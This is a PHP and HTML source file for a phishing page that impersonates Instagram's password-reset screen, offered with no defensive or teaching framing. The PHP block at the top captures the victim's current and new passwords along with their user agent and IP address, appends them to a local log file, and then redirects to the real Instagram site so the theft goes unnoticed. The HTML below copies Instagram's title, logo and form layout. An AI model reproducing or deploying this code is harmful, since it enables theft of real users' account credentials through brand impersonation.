<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST')
{
	$current_password = $_POST['current_password'] ?? null;
	$new_password = $_POST['new_password'] ?? null;

	if ($current_password && $new_password)
	{
		$data = "\n{\"current_password\": \"$current_password\", \"new_password\": \"$new_password\", \"user_agent\": \"$_SERVER[HTTP_USER_AGENT]\", \"ip_address\": \"$_SERVER[REMOTE_ADDR]}\"";
		$handle = fopen('logs.log', 'a');
		fwrite($handle, $data);
		fclose($handle);

		header('Location: https://instagram.com');
		exit;
	}	
}

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="theme-color" content="#fff">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="stylesheet" type="text/css" href="static/main.css">
	<link rel="icon" type="image/png" href="static/favicon.png">
	<title>Reset Password • Instagram</title>
</head>
<body>

	<header>
		<div class="navigation">
			<img src="static/logo.png" class="logo" draggable="false">
		</div>
	</header>

	<main>
		<div class="box">
			<p class="title">Set new password</p>
			<p>Enter your email, phone, or username and we'll send you a link to get back into your account</p>
			<form action="" method="POST" autocomplete="off">
				<input type="password" name="current_password" class="input" placeholder="Enter your current password" required>

				<input type="password" name="new_password" class="input" placeholder="Enter your new password" required>

				<input type="password" name="new_password" class="input" placeholder="Confirm new password" required>

				<button type="submit">Change</button>
			</form>
		</div>
	</main>

</body>
</html>